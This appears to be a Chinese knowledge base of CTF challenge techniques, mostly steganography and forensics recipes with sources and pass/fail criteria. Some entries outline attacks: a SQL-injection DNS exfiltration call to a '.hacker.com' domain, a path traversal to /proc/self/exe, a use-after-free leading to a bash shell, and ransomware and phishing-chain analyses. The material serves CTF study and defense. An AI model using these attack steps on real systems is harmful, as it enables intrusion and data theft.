- **判定标准**：PASS = 首字符读出 'f'（0b01100110 倒序）且全串满足 flag 格式；FAIL = 顺序读→得 0b01100110='f' 恰好对称、后续全乱（本条陷阱：人肉读模易在第二字符翻车）。
- **裁决词**：待复跑
- **来源**：强网杯 2015 ringtone｜Sixstars 战队｜raw/github-repos/sixstars/2015_qiangwang-cup_h_writeup.md（ringtone 段，200 分）
- **关联**：频谱图家族与 [[Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）]]、[[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]] 构成三独立来源群（2015 强网杯/2021 hackergame/2026 Zero Trace）。

### 语音念码留白的哈希约束恢复（小写/大小写双 SHA1 夹逼）
- **分层**：困难·单点
- **假设**：语音念码 transmission 中故意留白的字符（听录为 ?），可用极小字符空间对已知 sha1 做约束恢复；nugget 格式首位可格式化确定，剩余 3 缺用小写 sha1 碰撞，再对全串做大小写枚举匹配大写 sha1——两哈希分别锚定「内容」与「大小写排布」。
- **验证步骤**：1) 听录得 HV?5-G?UJ-1YQ7-?DYC-2WLR-E6?J；2) 按 nugget 格式判定第一缺=1；3) 36^3=46656 小空间枚举命中小写 sha1 B39E…224；4) 对完整串做 2^n 大小写枚举命中 0D35…F83；5) 双哈希同解提交。
- **判定标准**：PASS = 小写与大写 sha1 双命中且互相一致；FAIL = 把 mp3 当频谱/LSB 隐写载体逐层翻找（本条陷阱：载体是语音语义层而非信号层）。
- **裁决词**：待复跑
- **来源**：Hackvent 2015 Dec 9 Sound Transmission｜shiltemann｜raw/github-repos/shiltemann/2015_hackvent_h_readme.md（听录串+双 sha1 全在 WP）
- **关联**：与 [[频谱图高频区二进制读模（0.1+0.4x 秒网格 + 8bit 倒序）]] 同为音频载体但分层不同（语义层 vs 信号层）；与 [[NATO 音标拼读听录（leftbracket 占位词定位括号）]] 构成听录双解。

### WAV 帧字节 LSB 流提取（wave.readframes 全帧低位）
- **分层**：困难·单点
- **假设**：wav 每采样帧字节的最低位按帧序连成比特流，以 8bit 分组拼 hex 再 unhexlify 即明文——音频 LSB 无需外部密钥，仅按帧顺序取 `ord(frame)&0x1`。
- **验证步骤**：1) python wave.open 读全帧；2) 逐帧取最低位拼接比特串；3) int(bits,2) 转 hex 后 unhexlify；4) 输出即 flag。
- **判定标准**：PASS = 拼接流 unhexlify 后直接可读（ArkCon{n0w_Y0u_S33_M3_N0W_Y0u_D0nt}）；FAIL = 按声道交错假设重排比特（单声道 wave.readframes 已按帧交好，二次交错反而打乱）。
- **裁决词**：待复跑
- **来源**：ArkCon 2019 隐写挑战｜Dvd848/YaakovCohen88（文本版 WP）｜raw/github-repos/Dvd848/2019_searchable-text-txt_h_searchable-text.md（S3cr3tM3ss4g3.wav 全脚本）
- **关联**：与 [[WAV 帧字节 LSB 流提取（wave.readframes 全帧低位）]] 同族的图像版见 [[列主序 LSB 扫描（Rows lie. Columns don't）]]；希伯来语 WP 中「更高更强更好」缩写即 LSB 提示词值得迁移。

### 像素位布尔运算隐写（跨通道位合成 !r&(g^b)）
- **分层**：困难·单点
- **假设**：题目 hint 给出的位运算式（如 `!r & (g^b)`）作用于每像素 RGB 分量的最低位，输出 0/1 即一张二值图——跨通道布尔合成而非单通道 LSB，直接按提示公式重算可得 QR。
- **验证步骤**：1) PIL 逐像素读 (r,g,b)；2) bit=(~r&(g^b))&1；3) 按 bit 写黑/白生成新图；4) 扫 QR 出 nugget。
- **判定标准**：PASS = 合成图呈现可扫描 QR（HV14-KV5Q-f9O3-ysE8-v3EB-PBit）；FAIL = 对单通道做逐位 LSB 提取得噪声（跨通道运算式不看提示无从构造）。
- **裁决词**：待复跑
- **来源**：Hackvent 2014 Dec 19 Basic Steganography｜shiltemann｜raw/github-repos/shiltemann/2014_hackvent_h_alldays.md（完整 PIL 脚本+输出图在 WP）
- **关联**：与 [[GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）]] 同属「跨像素运算出 QR」家族；布尔式风格与 [[元数据伪旗注释的格式校验防误信]] 的提示驱动同源。

### 迷宫染色 QR 修复（非白即黑 + 邻接反色）
- **分层**：困难·单点
- **假设**：GIF 帧呈现迷宫状淡线实为褪色 QR：先做「非白即黑」二值化恢复线宽，再从角落起做区域染色（黑区变白、白区变黑）翻转反相，QR 即可扫。
- **验证步骤**：1) 逐帧取图，阈值二值化（非白→黑）；2) 从四角连通域开始染色；3) 相邻区域反色交替；4) 扫码取 nugget。
- **判定标准**：PASS = 染色后 QR 可读（HV16-otli-KbAg-MDVb-TMTO-WTDI）；FAIL = 仅做全局反相（局部交替染色的迷宫拓扑是必要步骤）。
- **裁决词**：待复跑
- **来源**：Hackvent 2016 Dec 11 A-maze-ing GIFt｜shiltemann｜raw/github-repos/shiltemann/2016_hackvent_h_readme.md（三步输出图均在 WP）
- **关联**：QR 修复三连：本条（拓扑染色）+ [[GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）]]（finder 补全）+ [[子图语义二分类重建 QR（87×87 比特矩阵）]]（语义分类）。

### 频谱图参数化清洗（audacity 线性尺度 + Hanning 窗模板）
- **分层**：困难·单点
- **假设**：wav 在默认频谱视图下拖影/糊化，flag 需要特定渲染参数才可读——audacity 用 linear scale + Frequencies 算法 + 2048 窗 + Hanning 窗型四件套重渲即出字。
- **验证步骤**：1) audacity 打开音频切频谱视图；2) scale=linear、algorithm=Frequencies、window size=2048、window type=Hanning；3) 读高频区字形。
- **判定标准**：PASS = 参数化后频谱现可读 flag（IceCTF{y0U_b3t7Er_l15TeN_cL053LY}）；FAIL = 默认 logarithmic + Blackman-Harris 窗糊成一团判「无隐写」。
- **裁决词**：待复跑
- **来源**：IceCTF 2016 Stage 3 Forensics: Audio Problems｜shiltemann｜raw/github-repos/shiltemann/2016_icectf_h_readme.md（四参数模板原文在 WP）
- **关联**：与 [[频谱图高频区二进制读模（0.1+0.4x 秒网格 + 8bit 倒序）]]（读模规则）和 [[Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）]]（工具链逆向）构成频谱图三解：参数模板/读模/逆向。

### 三维积木模型分层 QR（.lxf 专格式 + 视角拆解）
- **分层**：困难·单点
- **假设**：LEGO 模型文件（.lxf）表面是「不可疑」3D 模型，底部条纹状积木引向二元化死路；真实载体是顶面凸点高度分层——拉分层视图后每层凸点分布恰为 QR 的一层。专格式需要官方查看器打开。
- **验证步骤**：1) LEGO Builder 打开 .lxf；2) 识别底部 barcode 伪线索并放弃；3) 旋转视角观察顶面凸点高度差异；4) 拉开各层 → 组装出 QR → 扫码。
- **判定标准**：PASS = 分层视图出现 QR（nugget 在 WP）；FAIL = 把底部条纹当 3×20 比特矩阵硬解（视角缺位时 3D 载体退化成噪声）。
- **裁决词**：待复跑
- **来源**：HackyEaster 2015 Egg 3 Lego Stego｜shiltemann｜raw/github-repos/shiltemann/2015_hackyeaster_h_readme.md（截屏序列在 WP）
- **关联**：与 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]] 同为「多层分散+单点载体」；专格式查看器依赖与 [[FPGA 比特流逆向（iCE40 IceStorm 工具链）]] 的工具链破壁同型。

### 镜头畸变 QR 还原（GIMP Lens Distortion 逆向试参）
- **分层**：困难·单点
- **假设**：手机 app 闪屏里的 QR 经桶形/鱼眼畸变故意扭曲，GIMP 透镜畸变滤镜的反向参数（主点/边畸变/明度缩放）可视觉迭代还原到可扫描。
- **验证步骤**：1) APK 中提取闪屏资源图；2) GIMP 裁剪 QR 区；3) Filters→Distorts→Lens Distortion 逐步调参；4) 扫码。
- **判定标准**：PASS = 畸变反向后 QR 可读；FAIL = 用透视变换硬拉（径向畸变非线性，透视矩阵不可恢复）。
- **裁决词**：待复跑
- **来源**：HackyEaster 2015 Egg 9 Fisheye（移动端）｜shiltemann｜raw/github-repos/shiltemann/2015_hackyeaster_h_writeup.md（畸变前后对照图在 WP）
- **关联**：移动资源提取与 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]] 的 APK 侧挖掘互补；畸变修复与 [[迷宫染色 QR 修复（非白即黑 + 邻接反色）]] 组成 QR 可读化双板斧。

### 子图语义二分类重建 QR（87×87 比特矩阵）
- **分层**：困难·多段链
- **假设**：70MB 图由 224×224 子图平铺（87×87 网格），每格为狗或热狗二选一——语义层 1bit/子图，用图像识别 API 批量分类后按序拼比特矩阵重建 QR。
- **验证步骤**：1) imagemagick `convert -crop 224x224 +repage` 切 7569 子图；2) Clarifai general-v1.3 判「food」语义（5000 次/月配额，双账号跑满）；3) food→1/非 food→0 填 87×87 矩阵；4) 放大 5 倍出图扫码。
- **判定标准**：PASS = 比特矩阵呈 QR 且可扫；FAIL = 按像素级 LSB/色差分析（载体在语义层，位级无信号）。
- **裁决词**：待复跑
- **来源**：IceCTF 2018 Stego 300 Hot or Not｜shiltemann｜raw/github-repos/shiltemann/2018_icectf_h_readme.md（crop 参数+分类脚本全在 WP）
- **关联**：与 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]] 家族互补——本条是「AI 当工具」，那条是「AI 当受害者」；比特矩阵拼装与 [[子图语义二分类重建 QR（87×87 比特矩阵）]] 同型可复用。

### IEND 尾注 Baconian 大小写编码（strings 尾扫 + 字母表二分）
- **分层**：困难·单点
- **假设**：PNG 数据块后 append 的尾注文本用大小写当 Baconian 的 A/B（lowercase=A, uppercase=B），strings 扫 IEND 之后的可读串，按 5 位分组即解码。
- **验证步骤**：1) `strings HP.png` 找 IEND 后文本 `wherE ShOUld onE ReaLly lOoK fOr tHis flag`；2) 依「bacon sandwich」hint 选 Baconian；3) 大小写映射 aaabab…分 5 组；4) rumkin 解码得 flag。
- **判定标准**：PASS = 5 位分组解码出真词（bydelta）；FAIL = 把大小写当 morse/二进制直接读（Baconian 的 5bit 分组是必要结构）。
- **裁决词**：待复跑
- **来源**：Pragyan CTF 2016 Steganography 30: Harry Potter｜shiltemann｜raw/github-repos/shiltemann/2016_pragyan_h_readme.md（strings 输出+映射表在 WP）
- **关联**：与 [[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 同为「IEND 之后」手法但载文本非压缩包；与 [[元数据伪旗注释的格式校验防误信]] 共享「文件尾外溢内容先扫再信」直觉。

### 零宽变体选择符隐写（VS17-256 偏移分组解码）
- **分层**：困难·单点
- **假设**：任务下发 base64 blob 解出的「看似纯 ASCII」提示文本中藏 Unicode 变体选择符（U+E0100+，UTF-8 形如 F3 A0 8x），每个 VS 字符编码一比特/半字节——零宽不可见，对 AI 分析者天然免疫；按前缀组（F3A084/F3A085）分两组、组内减偏移（112/48）还原数值。
- **验证步骤**：1) GetTasks 响应 base64 解码；2) tagless protobuf 结构解析出任务字段；3) hex 扫 F3 A0 84/85 前缀的字节串；4) 分组减偏移拼 flag；5) 同时记录 visible 文本中的对抗性提示。
- **判定标准**：PASS = 字节流全部由 4 字节 VS 序列组成且解码出语义串；FAIL = 当作 UTF-8 乱码清洗掉（零宽字符即载荷本体）。
- **裁决词**：待复跑
- **来源**：CSCG 2025 Absolutely Nothing To See Here（MISC, Easy）｜よっちん｜raw/team-blogs/yocchin/2025_cscg-2025_absolutely-nothing-to-see-here.md（base64 原串+解码脚本在 WP）
- **关联**：与 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]] 构成「对 AI 免疫的双载体」；protobuf 字段解析与 [[DNS 间隙 Manchester 信标（查询长度二进制化）]] 的载荷封装同型。

### EXIF Make 字段跨图序拼接（同字段跨文件 + zsteg 补刀）
- **分层**：困难·单点
- **假设**：多张同源照片的 EXIF Make 字段各藏 flag 一段，按文件序拼接即全串；metadata 提示词（User Comment="Steganography"）指明下一层 zsteg 路线。
- **验证步骤**：1) exiftool 批量导出 Make 字段；2) 按文件名序拼接；3) 对含 User Comment 提示的图跑 zsteg；4) 双路都取。
- **判定标准**：PASS = 拼接串完整（FLAG_THE_WHO）且 zsteg 输出一致；FAIL = 只看单张图 metadata 就断言无隐写。
- **裁决词**：待复跑
- **来源**：Matrix CTF 2020 Searchable Text 合集挑战 #1/#2｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2020_searchable-text-txt_h_searchable-text.md（exiftool 对照截图描述在 WP）
- **关联**：单图多字段版见 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]]；zsteg 甄别细节见 [[zsteg 多通道输出甄别（真通道 + 字体文件第二跳）]]。

### 复合载体三段链（QR 扫描→ROT13→binwalk RAR→DTMF 解调）
- **分层**：困难·多段链
- **假设**：圣诞挂饰 PNG 中 QR 出 ROT13 提示，binwalk 发现尾部附加 RAR，内含 DTMF 音频——每层产物为下层入口，DTMF 数字序列时长呈 301/331ms 二分模式。
- **验证步骤**：1) 扫 QR 得 nyy lbh…→ROT13=all you need is here；2) binwalk santas_leak_new.png 提取 RAR；3) 内含 WAV 用在线 DTMF 解码得数字序列；4) 记录 0.301s/0.331s 双时长模式（未在本 WP 走完即注记）。
- **判定标准**：PASS = 三层贯通得 nugget（HV15-W!ll-R0ck-t#i$-xM4s-H0b0 见 frontmatter）；FAIL = 只扫 QR 即止（binwalk 对 PNG 尾 RAR 的命中是第二层唯一入口）。
- **裁决词**：待复跑
- **来源**：Hackvent 2015 Teaser: Santa's Leak｜shiltemann｜raw/github-repos/shiltemann/2015_hackvent_h_teaser-santas-leak.md（链路三步+DTMF 时长表在 WP）
- **关联**：与 [[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 同为「PNG 尾附件」但压缩包外溢 DTMF 音频；与 [[WAV 帧字节 LSB 流提取（wave.readframes 全帧低位）]] 构成音频双路。

### Go 勒索器逆向 + 云端密钥端点定位（strings 锚点）
- **分层**：困难·多段链
- **假设**：Go 编译的勒索样本对文档做加密并留 ransom note；密钥/密文经 GCS（*.appspot.com）拉取——strings 扫云端 URL 锚点，配合本地密文 blob 走「取回密钥→解密」链恢复文件。
- **验证步骤**：1) 运行样本观察文件与 note 变化；2) strings 扫 *.appspot.com/storage 端点；3) curl 取回密钥/密文对象；4) 按 Go 反编译定位加密分支（NaCl/AES）解密。
- **判定标准**：PASS = 云对象命中且文件解出原内容；FAIL = 本地暴力搜密钥（密钥在云端 bucket，本地无）。
- **裁决词**：待复跑
- **来源**：h4ck1ng q00gl3 e01c01（Episode 1 Challenge 01）｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2022_e01c01-md_h_e01c01.md（GCS 端点+note 全在 WP）
- **关联**：与 [[USB 数位板 HID 轨迹重建（Leftover Capture Data 字节序统计纠偏）]] 同事件集（h4ck1ng q00gl3 系列）；IoT/勒索取证与 [[SQL 调试日志暗格式还原（gzdeflate+b64 双层）+ DNS 外带痕迹重建]] 同属数据安全响应链。

### 管理接口路径穿越自体提取（/proc/self/exe 落盘）
- **分层**：困难·单点
- **假设**：固件管理接口的 patchnotes 读取功能可传相对路径，穿越 `../../../proc/self/exe` 可把运行中二进制自身整量拉出——「以服务读自己」绕过无源码限制，产出可逆向完整镜像。
- **验证步骤**：1) nc 连接口，读 cmdline 确认运行路径 ./main；2) patchnotes 参数传 ../../../proc/self/exe；3) pwntools 分块收流落盘 main；4) strings/反编译找隐藏密码或第二逻辑。
- **判定标准**：PASS = 落盘二进制 ELF 头完整且 size 合理；FAIL = 只穿越 /etc/passwd 等常规文件（自体提取才是本题意图）。
- **裁决词**：待复跑
- **来源**：Google CTF 2018 Admin UI 2｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2018_admin-ui-2-md_h_admin-ui-2.md（cmdline 输出+读流脚本在 WP）
- **关联**：与 [[逻辑分析仪会话封装还原（atkdl=zip+ini+通道 bin）]] 同为「固件/设备数据封装还原」；procfs 取证与 [[USB 数位板 HID 轨迹重建（Leftover Capture Data 字节序统计纠偏）]] 共享「系统接口当数据通道」直觉。

### 文件描述符表共享上下文错配（dup 双挂 + 引用计数失衡）
- **分层**：困难·单点
- **假设**：自实现文件表允许多个 fd 槽指向同一 file_context（dup 时引用计数 +1 并再挂一槽），close 按「槽位」而非「引用」释放——生命周期不变量破坏后，已释放上下文可被后续 create 重占，函数指针 p_close_func/p_read_func 可被写控，指向隐藏 win（execve /bin/bash）。
- **验证步骤**：1) 反编译确认 struct：ref_count/data_length/p_data/name[31]/四个函数指针；2) create→dup（同 ctx 双挂）→逐槽 close 跟 free 次数；3) 用 name/写通道重占 chunk 覆盖 p_close_func；4) 触发 close 调用 win。
- **判定标准**：PASS = shell 返回；FAIL = 把 name 字段 31 字符截断当溢出点（strncpy 限长已封死，缺口在引用计数）。
- **裁决词**：待复跑
- **来源**：36C3 Junior minifd｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2019_minifd-md_h_minifd.md（create/dup/close 反编译全在 WP）
- **关联**：与 [[EEPROM 二次读取竞态绕过（TOCTOU 认证标记）]] 同为「状态机二次访问」；win 函数定位直觉与 [[管理接口路径穿越自体提取（/proc/self/exe 落盘）]] 的固件内靶点同源。

### SQL 调试日志暗格式还原（gzdeflate+b64 双层）+ DNS 外带痕迹重建
- **分层**：困难·多段链
- **假设**：应用层日志（sqlshadow.log）先 gzdeflate 再 base64 落盘——按行 split(" - ")[1] 解双层即得原始 SQL；其中混入 `CALL exf(CONCAT(SUBSTRING(...),'.hacker.com'))` 型注入调用，可逐行重建 DNS 外带的数据分段与还原全串。
- **验证步骤**：1) 读 includes/logger.php 确认日志格式（gzdeflate+b64append）；2) python zlib.decompressobj(-MAX_WBITS)+b64decode 逐行解；3) 过滤 exf 调用行；4) 按 CONCAT 分段序还原 admin session；5) 标注外带域名模式。
- **判定标准**：PASS = 日志全解且外带分段可重组成连续串（DGHACK{…}）；FAIL = 把日志当明文 SQL 直接审计（双层暗格式不解，注入行不可见）。
- **裁决词**：待复跑
- **来源**：DGHack 2022 Shadow4DGA（Première partie）｜apoirrier（法语文本 WP）｜raw/github-repos/apoirrier/2022_dghack_h_shadow4dga.md（logger.php 源码+解日志脚本+外带语句全在 WP）
- **关联**：数据安全主链之一；与 [[钓鱼 DFIR 报告链（邮件→msc→VBScript 解混淆→白 EXE 黑 DLL→RAT）]] 构成「痕迹暗格式→攻击链重建」双篇；与 [[DNS 间隙 Manchester 信标（查询长度二进制化）]] 同为 DNS 通道但攻防视角对偶。

### 逻辑分析仪会话封装还原（atkdl=zip+ini+通道 bin）
- **分层**：困难·多段链
- **假设**：IoT 泄露的 .atkdl 实为 zip 容器：DL16 Plus 逻辑分析仪会话（channel.ini/set.ini/vernier.ini + 每 N 目录的 channel.ini 与采样 bin）——识别 vendor 封装后按 ini 参数（采样率 20000Hz、深度 40000000）解释通道波形即数字信号。
- **验证步骤**：1) file/zipinfo 识别 .atkdl 为 zip；2) 解包读 channel.ini 确认设备型号与采样参数；3) 解析通道 .bin 为电平序列；4) 按协议（UART/SPI 时序）重建传输位流。
- **判定标准**：PASS = 封装结构全解且通道电平可分段；FAIL = 把 .atkdl 当单一二进制逐字节硬解（vendor 封装不对口）。
- **裁决词**：待复跑
- **来源**：AppSec-IL 2025 The ART of IOT｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2025_the-art-of-iot-md_h_the-art-of-iot.md（unzip 清单+channel.ini 参数在 WP）
- **关联**：与 [[FPGA 比特流逆向（iCE40 IceStorm 工具链）]] 构成硬件载体双篇；采样参数驱动解析与 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]] 的参数先置法同型。

### 编码器已知明文灌注（fake flag 回读推映射）
- **分层**：困难·单点
- **假设**：二进制 mystery 读 flag.txt 做字节级编码后落 output（非 ISO-extended ASCII 字节流）；喂入已知 fake flag 并捕获其输出，可逐字节推映射（加法/XOR 偏移），再回灌解出真 flag——「编码器即 oracle」。
- **验证步骤**：1) xxd 读 output 字节流；2) 造目录喂 fake flag.txt 运行 mystery；3) Ghidra 反编译确认编码分支（picoCTF→8e 8e ba… 的逐字节变换）；4) 由已知明文-密文对推参数；5) 解全 output。
- **判定标准**：PASS = 映射参数对所有字节一致且解出 picoCTF{…}；FAIL = 对 output 做频率分析猜编码（有 oracle 就不必猜）。
- **裁决词**：待复跑
- **来源**：picoCTF 2019 Investigation-Encoded-1｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2019_investigation-encoded-1-md_h_investigation-encoded-1.md（xxd 输出+Ghidra main 在 WP）
- **关联**：oracle 思路与 [[子图语义二分类重建 QR（87×87 比特矩阵）]] 的「AI 当 oracle」同型不同层；与 [[zsteg 多通道输出甄别（真通道 + 字体文件第二跳）]] 的穷举-甄别互为对照组，共享「先造可控输入再观测」纪律。

### EEPROM 二次读取竞态绕过（TOCTOU 认证标记）
- **分层**：困难·单点
- **假设**：驱动流程为「读标记→SHA1 验证→再读同一标记→校验通过且与常量不等则吐 flag」——验证与使用之间存在二次读取窗口，改写 EEPROM 值即可让「已验证的旧值」与「再读的新值」错位，恒真验证 + 非原值触发 INTENT{…}。
- **验证步骤**：1) 仿真器跑通基线输出（INTENT 循环出现）；2) 反编译锁定 0x4000 偏移的读取点；3) 在 verify 与 re-read 之间写入同长度伪造串；4) 观察驱动吐 flag。
- **判定标准**：PASS = verified=true 且 marker≠G_AUTHENTICATION_MARKER 同时成立；FAIL = 直接改 SHA 校验逻辑（只读侧可改才是题设）。
- **裁决词**：待复跑
- **来源**：IntentCTF 2022 A Genuine Counterfeit｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2022_a-genuine-counterfeit-md_h_a-genuine-counterfeit.md（驱动完整 C 代码在 WP）
- **关联**：与 [[文件描述符表共享上下文错配（dup 双挂 + 引用计数失衡）]] 同为二次访问窗口；IoT 侧与 [[逻辑分析仪会话封装还原（atkdl=zip+ini+通道 bin）]] 共享仿真环境纪律。

### 伪 .gz 自定义分片容器（magic 15141312 + 序号 + base64 片重组）
- **分层**：困难·单点
- **假设**：message.gz 非 gzip：按 0x44 字节对齐后每片以 magic `15 14 13 12` + 4 字节序号 + 4 字节校验 + base64 载荷——按序号重组、去 magic 剥壳即原始消息流。
- **验证步骤**：1) `xxd -g 1 -c 68` 对齐观察重复头；2) 分片提取序号字段排序；3) 剥 12 字节壳拼 base64 流；4) 解码还原消息。
- **判定标准**：PASS = 每片 magic/序号单调递增且重组后语义完整；FAIL = 按文件魔数判 gzip 修复失败即弃（扩展名是伪旗）。
- **裁决词**：待复跑
- **来源**：Matrix CTF 2020 Fly Me To The Moon｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2020_fly-me-to-the-moon-md_h_fly-me-to-the-moon.md（两轮 hexdump 对照在 WP）
- **关联**：与 [[ASCII 十六进制转储回译 pcap（xxd -r -p + 证书吊销定位）]] 同为「伪格式信封剥离」；magic 模式发现法与 [[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 的字节搜索起点同型。

### USB 数位板 HID 轨迹重建（Leftover Capture Data 字节序统计纠偏）
- **分层**：困难·多段链
- **假设**：pcap 中 Wacom CTL-471 数位板被枚举为鼠标，真实轨迹在 wire shark 不解析的 Leftover Capture Data 四字节包里——按鼠标 spec 直解失败（字节序错位），对各字节做取值统计后按「B2≈0x80/0x81=按键、B3/B4≈0x00/0xFF=双补码位移」重解释，按键按下时落笔绘制轨迹即 flag。
- **验证步骤**：1) tshark 过滤 Device Address==6 的 USB 中断包；2) 提取 Leftover Capture Data 字段；3) 四字节取值统计定字段角色；4) 累计 x/y 位移、B2 按键时落点；5) PIL 画线。
- **判定标准**：PASS = 按重解释画出的轨迹可读（vs. 直解的抽象涂鸦）；FAIL = 按标准鼠标 spec 的 B1=按键/B2=x/B3=y 直接解（vendor 报文序不同）。
- **裁决词**：待复跑
- **来源**：CheckPoint CSA 2019 searchable-text（USB 数位板挑战）｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2019_searchable-text-txt_h_searchable-text_2.md（取值统计表+绘制脚本全在 WP）
- **关联**：与 [[DNS 间隙 Manchester 信标（查询长度二进制化）]] 共享「旁路字段承载位流」；与 [[USB 数位板 HID 轨迹重建（Leftover Capture Data 字节序统计纠偏）]] 的统计纠偏法可迁移到任何 HID 复盘。

### 千文件泥沙类型指纹漏斗（file+grep 单点筛选）
- **分层**：困难·单点（规模陷阱）
- **假设**：千级文件目录中混入唯一真图，扩展名全被抹——`file *` 的 magic 输出按「image/JPEG」指纹 grep 即漏斗收口；同类场景（PAM/PPM 中找 JPEG）全适用。
- **验证步骤**：1) `file * | grep -i image`；2) 对命中行复核 `file` 详情（JPEG JFIF 头）；3) 打开命中文件取 flag。
- **判定标准**：PASS = 唯一命中且可读（easyctf{it_must_be_pretty_hard_reading_this}）；FAIL = 逐文件人肉打开（规模即陷阱）。
- **裁决词**：待复跑
- **来源**：easyCTF 2015 A Picture is Worth a Thousand Words｜shiltemann｜raw/github-repos/shiltemann/2015_easyctf_h_readme.md（file 三行输出在 WP）
- **关联**：与 [[元数据伪旗注释的格式校验防误信]] 共享「先信格式指纹再信内容」；规模化 triage 的反向场景（海中捞针 → 已捞针后剔伪）与 [[元数据伪旗注释的格式校验防误信]] 闭环。

### JSON 载体图 XOR 计数器流水（相似度配对 + R 通道差分）
- **分层**：困难·多段链
- **假设**：JSON 内嵌多张「几乎与网图相同」的载体图，每张与对应基图逐像素 R 通道 XOR 再叠 counter 才是字节——先要按视觉相似度把每张载体图配对到正确基图，错配即得乱码。
- **验证步骤**：1) JSON 解出全部载体图；2) 下载/比对基图（像素差异可视化锁定配对）；3) user[x,y][R]^base[x,y][R]^counter 逐像素流水；4) 跳过零差异像素；5) 拼接输出。
- **判定标准**：PASS = 配对正确时首像素 XOR 出 0x41('A') 且全串连贯；FAIL = 固定单一基图跑全部载体（配对错=全错）。
- **裁决词**：待复跑
- **来源**：Shabak CTF 2018 searchable-text（JSON 图像 XOR 挑战）｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2018_searchable-text-txt_h_searchable-text.md（38/103 双值例证+PIL 脚本在 WP）
- **关联**：与 [[GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）]] 同为「基图 XOR」但加 counter+配对两重门槛；配对直觉与 [[EXIF Make 字段跨图序拼接（同字段跨文件 + zsteg 补刀）]] 的跨图顺序同型。

### ASCII 十六进制转储回译 pcap（xxd -r -p + 证书吊销定位）
- **分层**：困难·多段链
- **假设**：dump.bin 是 ASCII 空格分隔 hex（伪取证转储）——`xxd -r -p` 回译为真二进制即 pcap；随后在 TLS 会话中定位被复用/应吊销的证书（客户端 hello 与服务端证书链比对），吊销即目标。
- **验证步骤**：1) cat head 确认 ASCII hex 形态；2) xxd -r -p 回译；3) file/binwalk 验 pcap 结构；4) Wireshark 解 TLS 流取证书指纹；5) 对照吊销线索定位 compromise 资产。
- **判定标准**：PASS = 回译后 binwalk 识别合法网络流且证书可提取；FAIL = 把 ASCII hex 当字符数据搜索 flag（回译是第一步）。
- **裁决词**：待复跑
- **来源**：Matrix CTF 2021 The Best of Times（Forensics 150）｜Dvd848（文本版 WP）｜raw/github-repos/Dvd848/2021_the-best-of-times-md_h_the-best-of-times.md（两轮 hexdump 对照在 WP）
- **关联**：与 [[伪 .gz 自定义分片容器（magic 15141312 + 序号 + base64 片重组）]] 同为「信封假格式」；证书侧与 [[SQL 调试日志暗格式还原（gzdeflate+b64 双层）+ DNS 外带痕迹重建]] 共享「资产溯源」视角。

### 单像素条带图维度重排（55440×1 因子穷举 reshape）
- **分层**：困难·单点
- **假设**：PNG 实际尺寸 55440×1（像素条带），按总像素数做因子分解穷举 (w,h) 组合 reshape，命中使图像可读的宽高即还原。
- **验证步骤**：1) exiftool 读 Image Size=55440x1；2) 写 divisors 穷举 55440 全因子对；3) PIL reshape 逐一渲染；4) 目检选可读输出。
- **判定标准**：PASS = 某因子对下图像恢复语义（photosynthesis 系列全尺寸）；FAIL = 只试常见 4:3/16:9 比例（55440=2^4·3^2·5·7·11 组合空间大，需全因子）。
- **裁决词**：待复跑
- **来源**：CAMS CTF 2016 photosynthesis1（2D photo lost one dimension）｜shiltemann｜raw/github-repos/shiltemann/2016_cctf_h_readme.md（exiftool 输出+divisors 脚本在 WP）
- **关联**：与 [[列主序 LSB 扫描（Rows lie. Columns don't）]] 同为「几何重排出真相」；与 [[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 共享「结构先于内容」直觉。

### 钓鱼 DFIR 报告链（邮件→msc→VBScript 解混淆→白 EXE 黑 DLL→RAT）
- **分层**：困难·多段链
- **假设**：钓鱼邮件带加密附件（密码=活动名），内 .msc 管理控制台载荷第 97 行起执行，拉取第二段 VBScript（字符串混淆的 s****s 函数参数）落地白 EXE+黑 DLL（DLL 侧加载，ATT&CK T1574 大类）最终起 RAT——按问卷链路逐问取证可复现全链。
- **验证步骤**：1) 邮件头提取攻击者邮箱并 MD5 留痕；2) md5sum 附件+解压密码 2024qwbs8；3) 定位 .msc 初始执行行（97）与第二载荷语言（VBScript）；4) 解字符串混淆得 s****s 参数并 MD5；5) 映射 MITRE T1574；6) 确认最终 RAT 载荷（java 马为干扰项）。
- **判定标准**：PASS = 十二问全链闭环且各哈希可复算；FAIL = 把 java RAT 干扰项当最终载荷（hint 明示无关）。
- **裁决词**：待复跑
- **来源**：强网杯 2024 Master of DFIR - Phishing｜CTF-Archives 官方存档｜raw/cn-events/qwb2024/2024_qwb2024_master-of-dfir-phishing.md（十二问+双 hint 全在 WP）
- **关联**：数据安全主链之二；与 [[SQL 调试日志暗格式还原（gzdeflate+b64 双层）+ DNS 外带痕迹重建]] 组成入侵链重建双视角（主机侧/网络侧）；ATT&CK 映射与 [[Go 勒索器逆向 + 云端密钥端点定位（strings 锚点）]] 的样本侧溯源互补。

### DeepSound 音频隐写 hash 提取与离线爆破
- **分层**：困难·流程
